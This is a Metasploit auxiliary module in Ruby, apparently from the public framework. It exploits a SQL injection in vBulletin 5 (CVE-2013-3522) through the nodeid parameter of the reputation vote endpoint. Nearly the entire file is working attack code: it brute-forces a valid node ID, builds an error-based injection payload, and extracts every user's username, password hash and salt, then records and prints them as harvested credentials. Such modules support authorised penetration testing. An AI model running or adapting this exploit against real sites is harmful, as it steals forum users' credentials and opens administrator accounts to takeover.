##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability found in vBulletin 5 that has been
        used in the wild since March 2013. This module can be used to extract the web application's
        usernames and hashes, which could be used to authenticate into the vBulletin admin control
        panel.
      },
      'References'     =>
        [
          [ 'CVE', '2013-3522' ],
          [ 'OSVDB', '92031' ],
          [ 'EDB', '24882' ],
          [ 'BID', '58754' ],
          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
        ],
      'Author'         =>
        [
          'Orestis Kourides', # Vulnerability discovery and PoC
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2013-03-24'
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to vBulletin', '/']),
        OptInt.new("NODE", [false, 'Valid Node ID']),
        OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
        OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
      ])
  end

  def exists_node?(id)
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    result = do_sqli(id, "select '#{mark}'")

    if result and result =~ /#{mark}/
      return true
    end

    return false
  end

  def brute_force_node
    min = datastore["MINNODE"]
    max = datastore["MAXNODE"]

    if min > max
      print_error("MINNODE can't be major than MAXNODE")
      return nil
    end

    for node_id in min..max
      if exists_node?(node_id)
        return node_id
      end
    end

    return nil
  end

  def get_node
    if datastore['NODE'].nil? or datastore['NODE'] <= 0
      print_status("Brute forcing to find a valid node id...")
      return brute_force_node
    end

    print_status("Checking node id #{datastore['NODE']}...")
    if exists_node?(datastore['NODE'])
      return datastore['NODE']
    else
      return nil
    end
  end

  # session maybe isn't needed, unauthenticated
  def do_sqli(node, query)
    mark = Rex::Text.rand_text_alpha(5 + rand(3))
    random_and = Rex::Text.rand_text_numeric(4)
    injection = ") and(select 1 from(select count(*),concat((select (select concat('#{mark}',cast((#{query}) as char),'#{mark}')) "
    injection << "from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) "
    injection << "AND (#{random_and}=#{random_and}"

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
      'vars_post' =>
        {
          'nodeid'  => "#{node}#{injection}",
        }
      })

    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/
      return nil
    end

    data = ""

    if res.body.to_s =~ /#{mark}(.*)#{mark}/
      data = $1
    end

    return data
  end

  def get_user_data(node_id, user_id)
    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id+1}")
    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id+1}")
    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id+1}")

    return [user, pass, salt]
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "index.php")
    })

    if res and res.code == 200 and res.body.to_s =~ /"simpleversion": "v=5/
      if get_node
        # Multiple factors determine this LOOKS vulnerable
        return Msf::Exploit::CheckCode::Appears
      else
        # Not enough information about the vuln state, but at least we know this is vbulletin
        return Msf::Exploit::CheckCode::Detected
      end
    end

    Msf::Exploit::CheckCode::Safe
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :nonreplayable_hash,
      jtr_format: 'md5'
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    print_status("Checking for a valid node id...")
    node_id = get_node
    if node_id.nil?
      print_error("node id not found")
      return
    end

    print_good("Using node id #{node_id} to exploit sqli... Counting users...")
    data = do_sqli(node_id, "select count(*) from user")
    if data.blank?
      print_error("Error exploiting sqli")
      return
    end
    count_users = data.to_i
    print_good("#{count_users} users found. Collecting credentials...")

    users_table = Rex::Text::Table.new(
      'Header'  => 'vBulletin Users',
      'Indent'   => 1,
      'Columns' => ['Username', 'Password Hash', 'Salt']
    )

    for i in 0..count_users
      user = get_user_data(node_id, i)
      unless user.join.empty?
        report_cred(
          ip: rhost,
          port: rport,
          user: user[0],
          password: user[1],
          service_name: (ssl ? "https" : "http"),
          proof: "salt: #{user[2]}"
        )
        users_table << user
      end
    end

    if users_table.rows.length > 0
      print_good("#{users_table.rows.length.to_s} credentials successfully collected")
      print_line(users_table.to_s)
    else
      print_error("Unfortunately the module was unable to extract any credentials")
    end
  end


end

